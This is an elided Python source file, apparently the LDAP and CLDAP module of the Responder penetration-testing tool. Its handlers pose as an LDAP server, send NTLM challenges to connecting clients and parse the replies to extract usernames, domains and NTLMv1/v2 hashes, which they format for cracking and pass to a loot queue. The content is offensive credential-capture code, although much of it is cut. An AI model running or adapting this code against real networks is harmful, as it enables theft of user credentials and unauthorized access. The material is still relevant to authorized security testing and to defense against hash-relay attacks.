...
if (sys.version_info > (3, 0)):
    ...
    from SocketServer import BaseRequestHandler
from responder.packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, \
    LDAPSearchSupportedMechanismsPacket, LDAPNTLMChallenge, CLDAPNetlogon
...
def ParseSearch(data):
    ...
    if re.search(b'Netlogon', data):
        ...
        t = CLDAPNetlogon(MessageIDASNStr=TID, CLDAPMessageIDStr=TID, NTLogonDomainGUID=DomainGuid,
...
def ParseLDAPHash(data, client, Challenge, tool_q=None):  # Parse LDAP NTLMSSP v1/v2
    ...
    if NthashLen == 24:
        ...
        WriteHash = '%s::%s:%s:%s:%s' % (
        Username, Domain, LMHash, SMBHash, codecs.encode(Challenge, 'hex').decode('latin-1'))
    ...
    if NthashLen > 60:
        ...
        Username = SSPIString[UserOffset:UserOffset + UserLen].decode('UTF-16LE')
        WriteHash = '%s::%s:%s:%s:%s' % (
        Username, Domain, codecs.encode(Challenge, 'hex').decode('latin-1'), SMBHash[:32], SMBHash[32:])
...
def ParseNTLM(data, client, Challenge, tool_q=None):
    if re.search(b'(NTLMSSP\x00\x01\x00\x00\x00)', data):
        NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9].decode('latin-1'),
                                      NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
        NTLMChall.calculate()
        return NTLMChall
    elif re.search(b'(NTLMSSP\x00\x03\x00\x00\x00)', data):
        ParseLDAPHash(data, client, Challenge, tool_q=tool_q)


def ParseCLDAPPacket(data, client, Challenge, tool_q=None):
    if data[1:2] == b'\x84':
...
def ParseLDAPPacket(data, client, Challenge, tool_q=None):
    if data[1:2] == b'\x84':
        PacketLen = struct.unpack('>i', data[2:6])[0]
        ...
        if Operation == b'\x60':  # Bind
            ...
            if sasl == b'\xA3':
                Buffer = ParseNTLM(data, client, Challenge, tool_q=tool_q)
                return Buffer
...
class LDAP(BaseRequestHandler):
    def handle(self):
        try:
            ...
            for x in range(5):
                Buffer = ParseLDAPPacket(data, self.client_address[0], Challenge, tool_q=self.server.loot_q)
                if Buffer:
...
class CLDAP(BaseRequestHandler):
    def handle(self):
        try:
            ...
            Challenge = RandomChallenge()
            for x in range(1):
                Buffer = ParseCLDAPPacket(data, self.client_address[0], Challenge, tool_q=self.server.tool_q)
                if Buffer:
